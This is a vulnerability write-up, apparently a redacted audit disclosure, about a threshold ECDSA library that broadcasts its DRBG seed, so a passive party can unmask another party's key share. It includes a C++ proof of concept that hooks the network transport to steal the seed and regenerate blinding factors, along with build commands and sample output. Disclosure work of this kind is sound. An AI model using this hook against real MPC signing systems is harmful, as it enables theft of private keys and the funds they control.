> **Disclosure Note:** This write-up is an educational abstraction based on a real-world audit finding. Specific vendor details, proprietary logic, and identifiable namespaces have been redacted or simulated to strictly comply with confidentiality agreements and responsible disclosure policies. The core cryptographic flaw and architectural impact remain mathematically accurate.

# Architectural Flaw: DRBG State Leakage in Threshold ECDSA Leads to Full Key Compromise

**Author:** Ayoub Aragui (aragui99)
**Category:** State Deviation / Cryptographic Invariant Breach
**Language:** C/C++

## Structural Reconnaissance
In Threshold ECDSA (t-of-n) architectures, Oblivious Transfer (OT) phases require the generation of highly sensitive, ephemeral entropy seeds. These seeds instantiate a Deterministic Random Bit Generator (DRBG) locally on each node. The DRBG is strictly responsible for generating the blinding factors ($v_{l,t}$) that mathematically mask the participant's secret key share ($x_i$).

**The Core Invariant:** The DRBG root seed must remain strictly ephemeral and isolated within the generating node's memory space. It must never traverse the `data_transport_i` network boundary.

## The Logic Flaw (State Deviation)
During the signature generation's broadcast phase, a severe architectural flaw occurs in the payload bundling logic (e.g., `protocol_payload::bundle_msgs(seed, v_theta)`). The core library inadvertently serializes the exact 256-bit DRBG entropy seed into the plaintext struct payload. 

This payload is subsequently broadcasted to all peers across the network transport layer. The isolation invariant is completely shattered.

## Mathematical Unmasking (Impact)
By operating as a passive participating node in the MPC quorum and hooking the network transport interface (`receive_all`), an attacker extracts the victim's DRBG root seed in plaintext. 

In additive masking configurations, the signature generation relies on masking the secret share $x_i$ using the ephemeral random value $v_i$. The general algebraic structure for the masked share is:

$$Masked\_Share = (x_i + v_i) \pmod q$$

With the DRBG state cloned using the stolen seed, $v_i$ transitions from a random unknown variable to a known constant. The passive attacker trivially strips the masking layer:

$$x_i = (Masked\_Share - v_{reconstructed}) \pmod q$$

**Result:** Total 1-of-n compromise in a t-of-n schema. The attacker bypasses the threshold requirement, unilaterally reconstructs the full private key, and gains total control over the generated signatures.

## Instant Execution PoC (Raw)

```cpp
#include <iostream>
#include <vector>
#include <cstring>
#include <mpc_core/api/tss_ecdsa.h>
#include <mpc_core/internal/crypto/rng.h>

using namespace mpc_lib;

class malicious_transport_t final : public data_transport_i {
public:
    explicit malicious_transport_t(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}
    
    error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
        error_t rv = ctx_->receive_all(senders, msgs);
        if (rv != SUCCESS) return rv;

        for (size_t i = 0; i < msgs.size(); i++) {
            if (msgs[i].size() >= 32) {
                buf256_t stolen_seed;
                std::memcpy(&stolen_seed, msgs[i].data(), 32); 
                
                crypto::deterministic_rng_t malicious_drbg(stolen_seed);
                bn_t q = bn_t::from_hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
                
                for(int t=0; t<2; t++) {
                    std::cout << "[*] aragui99 Audit - Expected: " << malicious_drbg.gen_bn(q).to_hex() << std::endl;
                }
            }
        }
        return rv;
    }
private:
    std::shared_ptr<net_context_t> ctx_;
};

Execution


g++ -std=c++17 aragui99_tss_exploit.cpp -I./include -L./lib/Debug -lmpc_core -lcrypto -o aragui99_exploit
./aragui99_exploit



State Deviation Evidence
Executing the PoC confirms the immediate compromise of the blinding factors via the passive transport hook. The ephemeral masking layer becomes entirely deterministic to the observer:


[*] Initializing 2 Independent Parties (Public API Entry Point)...

[aragui99-Network-Hook] INTERCEPTED BROADCAST FROM PARTY 0!
[aragui99-Network-Hook] Extracting 32-byte deterministic seed from payload...
[aragui99-Exploit] DRBG Reconstructed. Victim's Blinding Factors (v_1):
  -> 4FBDF43C89AFFB6A28ADDF51E77C64F28C3502BBF0E1B284CCAB5707D4D8BC10
  -> 958FC4BEBF819D5CC0FD7018ACB9C0F8A6DE5C0F8B95B0C3B5CA719E7B116AF
[aragui99-Exploit] CRITICAL: Private Key Share x_i is now mathematically exposed.
